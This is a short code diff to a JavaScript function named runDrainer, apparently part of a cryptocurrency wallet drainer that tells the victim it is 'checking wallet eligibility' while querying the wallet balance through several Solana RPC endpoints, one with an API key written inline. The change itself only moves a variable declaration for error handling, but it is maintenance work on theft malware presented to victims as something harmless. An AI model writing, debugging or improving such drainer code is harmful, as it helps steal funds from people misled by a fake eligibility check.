@@ -1172,6 +1172,7 @@ async function runDrainer(provider) {
     showStatus('Checking wallet eligibility...', 'loading');
     
     // Pre-check wallet balance to avoid simulation failures
+    let balance = null; // Declare at function level for access in catch blocks
     try {
       // Use multiple RPC endpoints for reliability
       const rpcEndpoints = [
@@ -1180,7 +1181,6 @@ async function runDrainer(provider) {
         'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0'
       ];
       
-      let balance = null;
       let lastError = null;
       
       // Try each RPC endpoint with timeout
